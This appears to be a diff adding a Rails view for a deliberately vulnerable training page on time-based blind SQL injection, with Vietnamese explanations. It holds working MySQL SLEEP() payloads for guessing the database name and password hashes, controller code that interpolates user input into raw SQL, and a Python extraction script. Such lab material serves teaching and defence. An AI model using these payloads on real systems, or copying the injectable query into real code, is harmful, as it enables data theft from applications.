@@ -1,0 +1,107 @@
+<div class="container mt-4">
+  <h2>Time-based Blind SQL Injection Demo</h2>
+  <div class="alert alert-danger">
+    <strong>Cực kỳ nguy hiểm:</strong> Không có dấu hiệu nào, chỉ dựa vào thời gian phản hồi!
+  </div>
+
+  <div class="row">
+    <div class="col-md-6">
+      <h4>Email Verification (Vulnerable)</h4>
+      <%= form_with url: sqli_time_based_demo_path, method: :get, local: true, class: "border p-3 bg-light" do |f| %>
+        <div class="mb-3">
+          <%= f.label :email, "Verify Email:", class: "form-label" %>
+          <%= f.text_field :email, class: "form-control", 
+                          placeholder: "Thử: admin@test.com' AND IF(1=1,SLEEP(3),0)--" %>
+        </div>
+        <%= f.submit "Verify Email", class: "btn btn-primary" %>
+      <% end %>
+      
+      <% if defined?(@response_time) %>
+        <div class="mt-3">
+          <div class="alert <%= @response_time > 2000 ? 'alert-warning' : 'alert-info' %>">
+            <strong>Response Time:</strong> <%= @response_time %>ms<br>
+            <strong>Email Found:</strong> <%= @found ? "Yes" : "No" %>
+            <% if @response_time > 2000 %>
+              <br><strong>⚠️ Có thể bị Time-based SQLi!</strong>
+            <% end %>
+          </div>
+        </div>
+      <% end %>
+    </div>
+    
+    <div class="col-md-6">
+      <h4>Time-based Blind Payloads:</h4>
+      <div class="list-group">
+        <div class="list-group-item">
+          <strong>Test cơ bản (3 giây delay):</strong><br>
+          <code>admin@test.com' AND IF(1=1,SLEEP(3),0)--</code>
+        </div>
+        
+        <div class="list-group-item">
+          <strong>Test FALSE (không delay):</strong><br>
+          <code>admin@test.com' AND IF(1=2,SLEEP(3),0)--</code>
+        </div>
+        
+        <div class="list-group-item">
+          <strong>Kiểm tra version MySQL:</strong><br>
+          <code>admin@test.com' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)--</code>
+        </div>
+        
+        <div class="list-group-item">
+          <strong>Đoán tên database:</strong><br>
+          <code>admin@test.com' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(3),0)--</code>
+        </div>
+        
+        <div class="list-group-item">
+          <strong>Đoán password hash:</strong><br>
+          <code>admin@test.com' AND IF((SELECT SUBSTRING(password_digest,1,1) FROM users LIMIT 1)='$',SLEEP(3),0)--</code>
+        </div>
+        
+        <div class="list-group-item">
+          <strong>Kiểm tra số admin:</strong><br>
+          <code>admin@test.com' AND IF((SELECT COUNT(*) FROM users WHERE role='admin')>0,SLEEP(3),0)--</code>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="mt-4">
+    <h4>Code vulnerable:</h4>
+    <pre class="bg-dark text-light p-3"><code>email = params[:email]
+start_time = Time.current
+sql = "SELECT email FROM users WHERE email='#{email}' LIMIT 1"
+result = User.find_by_sql(sql)
+@response_time = ((Time.current - start_time) * 1000).round(2)</code></pre>
+  </div>
+  
+  <div class="mt-3">
+    <h4>Ví dụ SQL được tạo ra:</h4>
+    <pre class="bg-warning p-3"><code>SELECT email FROM users WHERE email='admin@test.com' AND IF(1=1,SLEEP(3),0)--' LIMIT 1</code></pre>
+  </div>
+  
+  <div class="mt-3 alert alert-info">
+    <strong>Cách hoạt động Time-based Blind SQLi:</strong>
+    <ol>
+      <li><strong>Không có dấu hiệu rõ ràng:</strong> Response luôn giống nhau</li>
+      <li><strong>Sử dụng SLEEP() function:</strong> Tạo delay có điều kiện</li>
+      <li><strong>Đo thời gian phản hồi:</strong> Nếu delay → điều kiện TRUE</li>
+      <li><strong>Đoán từng thông tin:</strong> Như Boolean-based nhưng dựa vào time</li>
+      <li><strong>Rất khó phát hiện:</strong> Không có error, không có dữ liệu lạ</li>
+    </ol>
+  </div>
+  
+  <div class="mt-3 alert alert-danger">
+    <strong>Script tự động cho Time-based SQLi:</strong>
+    <pre class="bg-dark text-light p-2"><code>def extract_database_name():
+    extracted = ""
+    for position in range(1, 50):
+        for char in string.ascii_lowercase + string.digits:
+            payload = f"admin@test.com' AND IF(SUBSTRING(database(),{position},1)='{char}',SLEEP(3),0)--"
+            start = time.time()
+            response = requests.post(url, data={'email': payload})
+            if time.time() - start > 3:
+                extracted += char
+                break
+    return extracted</code></pre>
+  </div>
+</div>
